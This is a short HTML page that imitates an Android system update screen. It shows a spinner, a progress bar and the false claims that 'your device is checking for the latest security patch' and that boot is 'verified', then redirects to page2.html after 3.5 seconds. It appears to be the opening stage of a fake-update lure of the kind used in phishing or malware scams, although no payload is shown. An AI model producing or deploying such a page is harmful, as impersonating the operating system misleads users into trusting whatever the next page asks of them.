<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
<title>Checking Updates</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:16px;padding:32px;max-width:380px;width:100%;text-align:center;box-shadow:0 2px 20px rgba(0,0,0,0.08)}
.spinner{width:48px;height:48px;margin:0 auto 20px;border:3px solid #e0e0e0;border-top:3px solid #1976d2;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
h2{font-size:20px;color:#1a1a1a;margin-bottom:6px}
p{font-size:14px;color:#666;margin-bottom:20px}
.progress{height:3px;background:#e0e0e0;border-radius:2px;overflow:hidden}
.progress-bar{height:100%;background:linear-gradient(90deg,#1976d2,#42a5f5);width:0%;animation:load 3s ease-in-out forwards}
@keyframes load{0%{width:0%}50%{width:65%}100%{width:100%}}
.info{font-size:11px;color:#999;margin-top:20px;padding-top:14px;border-top:1px solid #eee}
</style>
</head>
<body>
<div class="card">
<div class="spinner"></div>
<h2>Checking for updates...</h2>
<p>Your device is checking for the latest security patch.</p>
<div class="progress"><div class="progress-bar"></div></div>
<div class="info">Android Security Patch: June 5, 2026 • Verified boot</div>
</div>
<script>setTimeout(()=>{window.location.href='page2.html'},3500);</script>
</body>
</html>
